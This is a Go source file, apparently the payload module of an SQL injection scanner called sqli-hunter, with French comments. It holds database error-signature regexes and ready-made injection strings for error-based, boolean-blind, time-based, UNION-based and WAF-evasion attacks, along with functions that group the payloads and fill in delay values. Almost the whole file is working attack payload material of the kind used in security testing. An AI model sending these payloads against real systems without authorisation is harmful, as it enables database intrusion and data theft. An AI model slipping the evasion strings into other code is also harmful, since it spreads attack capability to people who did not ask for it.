package payloads

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// SQLErrorPatterns associe un DBMS à des motifs d'erreur SQL.
var SQLErrorPatterns = map[string][]string{
	"mysql": {
		`SQL syntax.*MySQL`,
		`Warning.*mysql_`,
		`MySQLSyntaxErrorException`,
		`valid MySQL result`,
		`check the manual that corresponds to your (MySQL|MariaDB)`,
		`Unknown column`,
		`You have an error in your SQL syntax`,
		`mysql_fetch`,
		`mysqli_`,
	},
	"postgresql": {
		`PostgreSQL.*ERROR`,
		`Warning.*\Wpg_`,
		`valid PostgreSQL result`,
		`Npgsql\.`,
		`PG::SyntaxError:`,
		`org\.postgresql\.util\.PSQLException`,
		`ERROR:\s+syntax error at or near`,
		`unterminated quoted string`,
	},
	"mssql": {
		`Driver.* SQL[\-\_\ ]*Server`,
		`OLE DB.* SQL Server`,
		`(\W|\A)SQL Server.*Driver`,
		`Warning.*mssql_`,
		`(\W|\A)SQL Server.*[Ee]xception`,
		`System\.Data\.SqlClient\.`,
		`Unclosed quotation mark`,
		`Microsoft SQL Native Client error`,
		`\[SQL Server\]`,
		`ODBC SQL Server Driver`,
		`SQLServer JDBC Driver`,
		`com\.microsoft\.sqlserver\.jdbc`,
	},
	"oracle": {
		`\bORA-\d{5}`,
		`Oracle error`,
		`Oracle.*Driver`,
		`Warning.*\Woci_`,
		`Warning.*\Wora_`,
		`quoted string not properly terminated`,
	},
	"sqlite": {
		`SQLite/JDBCDriver`,
		`SQLite\.Exception`,
		`System\.Data\.SQLite\.SQLiteException`,
		`Warning.*sqlite_`,
		`Warning.*SQLite3::`,
		`\[SQLITE_ERROR\]`,
		`SQLITE_CONSTRAINT`,
		`unrecognized token`,
		`near ".*": syntax error`,
	},
	"generic": {
		`SQL syntax`,
		`syntax error`,
		`unexpected end of SQL command`,
		`quoted string not properly terminated`,
		`unclosed quotation mark`,
		`SQL command not properly ended`,
	},
}

var errorPayloads = []string{
	"'",
	`"`,
	`' OR '1'='1`,
	`' OR '1'='1'--`,
	`' OR '1'='1'#`,
	`' OR '1'='1'/*`,
	`') OR ('1'='1`,
	`1' OR '1'='1`,
	`1 OR 1=1`,
	`1' OR '1'='1'-- -`,
	`admin'--`,
	`admin' #`,
	`' UNION SELECT NULL--`,
	`' UNION SELECT NULL,NULL--`,
	`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
	`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
	`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
	`' AND 1=CONVERT(int,(SELECT @@version))--`,
	`' AND 1=CAST((SELECT @@version) AS int)--`,
	`1; SELECT pg_sleep(0)--`,
	`'||(SELECT version())||'`,
}

var booleanTruePayloads = []string{
	`' OR '1'='1`,
	`' OR 1=1--`,
	`' OR 1=1#`,
	`1 OR 1=1`,
	`1' OR '1'='1'--`,
	`') OR ('1'='1'--`,
	`1) OR (1=1`,
	`' OR ''='`,
}

var booleanFalsePayloads = []string{
	`' AND '1'='2`,
	`' AND 1=2--`,
	`' AND 1=2#`,
	`1 AND 1=2`,
	`1' AND '1'='2'--`,
	`') AND ('1'='2'--`,
	`1) AND (1=2`,
	`' AND ''='`,
}

var timePayloadTemplates = []string{
	`' AND SLEEP(%d)--`,
	`' AND SLEEP(%d)#`,
	`1' AND SLEEP(%d)--`,
	`1) AND SLEEP(%d)--`,
	`'; WAITFOR DELAY '0:0:%d'--`,
	`'; SELECT pg_sleep(%d)--`,
	`1'; SELECT pg_sleep(%d)--`,
	`' AND (SELECT * FROM (SELECT(SLEEP(%d)))a)--`,
	`' OR (SELECT * FROM (SELECT(SLEEP(%d)))a)--`,
	`1' AND BENCHMARK(10000000,SHA1('test'))--`,
	`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--`,
}

var unionPayloads = []string{
	`' UNION SELECT NULL--`,
	`' UNION SELECT NULL,NULL--`,
	`' UNION SELECT NULL,NULL,NULL--`,
	`' UNION SELECT NULL,NULL,NULL,NULL--`,
	`' UNION SELECT NULL,NULL,NULL,NULL,NULL--`,
	`' UNION ALL SELECT NULL--`,
	`' UNION ALL SELECT NULL,NULL--`,
	`') UNION SELECT NULL--`,
	`') UNION SELECT NULL,NULL--`,
	`' UNION SELECT 1,2,3--`,
	`' UNION SELECT 1,@@version,3--`,
	`' UNION SELECT 1,version(),3--`,
	`0 UNION SELECT NULL,NULL,NULL--`,
	`-1 UNION SELECT NULL,NULL,NULL--`,
	`99999 UNION SELECT NULL,NULL,NULL--`,
}

var wafBypassPayloads = []string{
	`' oR '1'='1`,
	`'%20OR%20'1'='1`,
	`'/**/OR/**/'1'='1`,
	`'%09OR%091=1--`,
	`'%0aOR%0a1=1--`,
	`'%0dOR%0d1=1--`,
	`' UnIoN SeLeCt NULL--`,
	`' /*!50000OR*/ '1'='1`,
	`' /*!OR*/ '1'='1`,
	`1'||'1'='1`,
	`' OR 'x'='x`,
	`' OR 2>1--`,
	`admin'/**/--`,
	`' OR '1'='1' LIMIT 1--`,
}

// BooleanPair associe un payload vrai et faux pour le blind boolean.
type BooleanPair struct {
	True  string
	False string
}

// GetPayloads retourne les payloads groupés par technique.
func GetPayloads(techniques []models.InjectionType, includeWAF bool, custom []string) map[models.InjectionType][]string {
	result := make(map[models.InjectionType][]string)

	for _, t := range techniques {
		switch t {
		case models.ErrorBased:
			payloads := append([]string{}, errorPayloads...)
			if includeWAF {
				payloads = append(payloads, wafBypassPayloads...)
			}
			if len(custom) > 0 {
				payloads = append(payloads, custom...)
			}
			result[t] = payloads
		case models.BooleanBlind:
			combined := append([]string{}, booleanTruePayloads...)
			combined = append(combined, booleanFalsePayloads...)
			result[t] = combined
		case models.TimeBlind:
			result[t] = timePayloadTemplates
		case models.UnionBased:
			result[t] = unionPayloads
		}
	}

	return result
}

// GetBooleanPairs retourne les paires true/false pour le blind boolean.
func GetBooleanPairs() []BooleanPair {
	n := len(booleanTruePayloads)
	if len(booleanFalsePayloads) < n {
		n = len(booleanFalsePayloads)
	}
	pairs := make([]BooleanPair, 0, n)
	for i := 0; i < n; i++ {
		pairs = append(pairs, BooleanPair{
			True:  booleanTruePayloads[i],
			False: booleanFalsePayloads[i],
		})
	}
	return pairs
}

// FormatTimePayloads génère les payloads time-based avec le délai configuré.
func FormatTimePayloads(delaySec int) []string {
	out := make([]string, 0, len(timePayloadTemplates))
	for _, tmpl := range timePayloadTemplates {
		if strings.Contains(tmpl, "BENCHMARK") {
			out = append(out, tmpl)
			continue
		}
		out = append(out, fmt.Sprintf(tmpl, delaySec))
	}
	return out
}

// AllTechniques retourne toutes les techniques disponibles.
func AllTechniques() []models.InjectionType {
	return []models.InjectionType{
		models.ErrorBased,
		models.BooleanBlind,
		models.TimeBlind,
		models.UnionBased,
	}
}
